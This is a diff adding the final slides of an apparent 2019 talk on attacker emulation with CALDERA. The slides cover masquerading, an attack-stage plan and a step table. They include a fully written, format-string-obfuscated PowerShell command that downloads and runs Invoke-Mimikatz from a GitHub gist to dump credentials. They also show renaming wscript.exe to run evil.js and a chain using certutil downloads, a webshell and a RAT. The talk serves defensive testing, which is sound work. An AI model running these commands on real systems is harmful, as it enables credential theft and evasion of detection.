+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb6-1" data-line-number="1">powershell.exe /c &quot;i`e`x(&quot;&quot;&quot;{27}{19}{37}{26}{23}{40}{21}{12}{33}{15}{5}{30}{10}{28}{3}{1}{0}{9}{11}{43}{20}{14}{7}{31}{22}{13}{24}{6}{39}{42}{2}{17}{38}{36}{4}{18}{16}{32}{29}{8}{25}{35}{34}{41}&quot;&quot;&quot;-f&quot;&quot;&quot;Splo&quot;&quot;&quot;,&quot;&quot;&quot;ower&quot;&quot;&quot;,&quot;&quot;&quot;tion&quot;&quot;&quot;,&quot;&quot;&quot;ia/P&quot;&quot;&quot;,&quot;&quot;&quot;katz&quot;&quot;&quot;,&quot;&quot;&quot;om/P&quot;&quot;&quot;,&quot;&quot;&quot;7b3/&quot;&quot;&quot;,&quot;&quot;&quot;7273&quot;&quot;&quot;,&quot;&quot;&quot;imik&quot;&quot;&quot;,&quot;&quot;&quot;it/4&quot;&quot;&quot;,&quot;&quot;&quot;Shel&quot;&quot;&quot;,&quot;&quot;&quot;c7a2&quot;&quot;&quot;,&quot;&quot;&quot;serc&quot;&quot;&quot;,&quot;&quot;&quot;16d9&quot;&quot;&quot;,&quot;&quot;&quot;1cd3&quot;&quot;&quot;,&quot;&quot;&quot;nt.c&quot;&quot;&quot;,&quot;&quot;&quot;&#39;); &quot;&quot;&quot;,&quot;&quot;&quot;/Inv&quot;&quot;&quot;,&quot;&quot;&quot;.ps1&quot;&quot;&quot;,&quot;&quot;&quot;IWR &quot;&quot;&quot;,&quot;&quot;&quot;c793&quot;&quot;&quot;,&quot;&quot;&quot;hubu&quot;&quot;&quot;,&quot;&quot;&quot;e17b&quot;&quot;&quot;,&quot;&quot;&quot;/raw&quot;&quot;&quot;,&quot;&quot;&quot;5986&quot;&quot;&quot;,&quot;&quot;&quot;atz &quot;&quot;&quot;,&quot;&quot;&quot;ps:/&quot;&quot;&quot;,&quot;&quot;&quot;IEX(&quot;&quot;&quot;,&quot;&quot;&quot;lMaf&quot;&quot;&quot;,&quot;&quot;&quot;ke-M&quot;&quot;&quot;,&quot;&quot;&quot;ower&quot;&quot;&quot;,&quot;&quot;&quot;c5d8&quot;&quot;&quot;,&quot;&quot;&quot;Invo&quot;&quot;&quot;,&quot;&quot;&quot;onte&quot;&quot;&quot;,&quot;&quot;&quot;pCre&quot;&quot;&quot;,&quot;&quot;&quot;-Dum&quot;&quot;&quot;,&quot;&quot;&quot;Mimi&quot;&quot;&quot;,&quot;&quot;&quot;&#39;htt&quot;&quot;&quot;,&quot;&quot;&quot;oke-&quot;&quot;&quot;,&quot;&quot;&quot;Exfi&quot;&quot;&quot;,&quot;&quot;&quot;.git&quot;&quot;&quot;,&quot;&quot;&quot;ds&quot;&quot;&quot;,&quot;&quot;&quot;ltra&quot;&quot;&quot;,&quot;&quot;&quot;016f&quot;&quot;&quot;)&quot;</a></code></pre></div>
+<ol start="2" type="1">
+<li>Run command</li>
+</ol></li>
+<li><p><strong>Postcondition</strong>: the command successfully ran</p></li>
+</ul>
+<h1 id="masquerading">3: Masquerading</h1>
+<h1 id="beyond-standard-caldera-masqueradet1036">Beyond standard CALDERA: Masquerade<sup>T1036</sup></h1>
+<p><img src="img/iphone.jpg" class="split" /></p>
+<ul>
+<li>Renamed copy of a legitimate utility</li>
+<li>Simple way to bypass rule systems</li>
+</ul>
+<p><img src="img/powershell.png" /></p>
+<h1 id="beyond-standard-caldera-masqueradet1036-2">Beyond standard CALDERA: Masquerade<sup>T1036</sup> (2)</h1>
+<p>Example:</p>
+<ul>
+<li><strong>Precondition</strong>: the command <code>wscript.exe /e:jscript evil.js</code> needs to be run</li>
+<li><p><strong>Action</strong>:</p>
+<ol type="1">
+<li>Copy <code>wscript.exe</code> to <code>%appdata%/GoogleUpdate.exe</code></li>
+<li>Run <code>GoogleUpdate.exe /e:jscript evil.js</code></li>
+</ol></li>
+<li><p><strong>Postcondition</strong>: the command successfully ran</p></li>
+</ul>
+<pre><code>🔴 C:\Windows\System32\wininit.exe
+ └── ⚙️ C:\Windows\System32\services.exe
+   └── ⚙️ C:\Windows\System32\svchost.exe
+     └── ⚙️ C:\Windows\Temp\GoogleUpdate.exe /e:jscript evil.js</code></pre>
+<h1 id="plan">Plan</h1>
+<ul>
+<li><strong>Stage 0</strong>: Infect machine (outside scope)</li>
+<li><strong>Stage 1</strong>: Discovery / Lateral Movement</li>
+<li><strong>Stage 2</strong>: Execution</li>
+<li><strong>Stage 3</strong>: Persistence</li>
+<li>(<strong>Stage 4</strong>: Cover Tracks)</li>
+</ul>
+<h1 id="plan-2">Plan (2)</h1>
+<figure>
+<img src="img/stages.svg" alt="-" class="full-width-title" /><figcaption>-</figcaption>
+</figure>
+<h1 id="putting-it-together">Putting it together</h1>
+<h2 id="demo-time">Demo time!</h2>
+<video controls="controls">
+<source type="video/mp4" src="img/demo.mp4">
+</video>
+<h1 id="putting-it-together-2">Putting it together (2)</h1>
+<table>
+<colgroup>
+<col style="width: 0%" />
+<col style="width: 12%" />
+<col style="width: 21%" />
+<col style="width: 32%" />
+<col style="width: 21%" />
+<col style="width: 11%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Step</th>
+<th>Process</th>
+<th>Goal</th>
+<th>Artefacts</th>
+<th>Additional Techniques</th>
+<th>Relies on</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td><code>powershell.exe</code></td>
+<td>Run Mimikatz</td>
+<td></td>
+<td>Format string obfuscation</td>
+<td></td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td><code>powershell.exe</code></td>
+<td>Find other computers</td>
+<td></td>
+<td>Direct to StdIn</td>
+<td></td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>-</td>
+<td>Prepare webshell</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td><code>certutil.exe</code></td>
+<td>Download webserver ZIP</td>
+<td><code>394nxk7klci7vh.exe</code></td>
+<td>LOLBin</td>
+<td>3</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td><code>powershell.exe</code></td>
+<td>Find administrators</td>
+<td></td>
+<td>Direct to StdIn</td>
+<td></td>
+</tr>
+<tr class="even">
+<td>6</td>
+<td><code>commander.exe</code></td>
+<td>Create persistence</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr class="odd">
+<td>7</td>
+<td><code>rundll32.exe</code></td>
+<td>Extract / run webserver</td>
+<td><code>UpdateDeamon.exe</code>, <code>g5f.sct</code>, <code>4ebw1nk/*</code></td>
+<td>Masquerading</td>
+<td>4</td>
+</tr>
+<tr class="even">
+<td>8</td>
+<td><code>usbwebserver.exe</code></td>
+<td>Test webshell</td>
+<td></td>
+<td></td>
+<td>4, 7</td>
+</tr>
+<tr class="odd">
+<td>9</td>
+<td><code>net.exe</code></td>
+<td>Mount network share</td>
+<td></td>
+<td></td>
+<td>1, 2, 5</td>
+</tr>
+<tr class="even">
+<td>10</td>
+<td><code>xcopy.exe</code></td>
+<td>Copy RAT</td>
+<td><code>commander.exe</code></td>
+<td></td>
+<td>9</td>
+</tr>
+</tbody>
+</table>
+<h1 id="aftermath">Aftermath</h1>
+<ul>
+<li>The real challenge starts now</li>
+</ul>
+<p><img src="img/signal.png" /></p>
+<h1 id="attacker-emulation-going-forward">Attacker Emulation going forward</h1>
+<ul>
+<li><strong>Community</strong>!</li>
+<li>Sharing CALDERA modules (like Metasploit)</li>
+<li>Industry standard</li>
+</ul>
+<h1 id="and-lets-remind-ourselves">.. and let’s remind ourselves</h1>
+<p>Attacker Emulation ≠ silver bullet <!-- Let's not fool ourselves by thinking this will solve all our problems --> <!-- A lot of researchers/devs think that whatever they're working on is the most important thing ever and will solve all our problems --> <!-- Whilest very powerfull, other techniques (like pentesting/red teaming) will remain necessary --></p>
+<h1 id="key-takeaways">Key takeaways</h1>
+<ol type="1">
+<li>Attacker emulation helps <strong>understand threats</strong> and <strong>your defences</strong></li>
+<li>Do attacker emulation the <strong>right way</strong>:
+<ul>
+<li>Make it random</li>
+<li>Make it real</li>
+</ul></li>
+<li>Doesn’t have to be difficult!</li>
+<li><strong>Community</strong>-based sharing</li>
+</ol>
+<h1 id="getting-in-touch">Getting in touch</h1>
+<ul>
+<li>Code and slides on <a href="https://www.github.com/wietze">github.com/wietze</a></li>
+<li><a href="https://www.twitter.com/wietze">@Wietze</a> on Twitter</li>
+<li>Email via <a href="mailto:wietze.beukema@pwc.com">wietze.beukema@pwc.com</a> <!-- replace with personal email? --></li>
+</ul>
+
+<div class="slide finalpage">
+    <h1>Thank you</h1>
+
+    <div class="copyright-box"><div>This content is for general information purposes only, and should not be used as a substitute for consultation with professional advisors.<br /><br />© 2019 PricewaterhouseCoopers LLP. All rights reserved. PwC refers to the UK member firm, and may sometimes refer to the PwC network. Each member firm is a separate legal entity. Please see www.pwc.com/structure for further details.</div></div>
+</div>
+
+</body>
+</html>
